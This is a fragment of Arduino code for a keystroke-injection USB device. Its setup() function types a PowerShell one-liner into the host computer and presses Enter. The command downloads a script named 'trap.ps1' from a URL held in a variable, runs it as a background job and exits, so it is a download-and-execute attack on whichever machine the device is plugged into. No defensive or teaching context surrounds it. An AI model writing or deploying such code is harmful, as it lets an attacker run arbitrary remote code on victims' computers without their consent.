...
void setup() {
  ...
  Keyboard.print("[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $down = New-Object System.Net.WebClient; $url = '" + url +"'; $file = 'trap.ps1'; $down.DownloadFile($url,$file); Start-Job -ScriptBlock { ./trap.ps1 }; exit;");
  delay(200);
  Keyboard.click(KEY_RETURN);
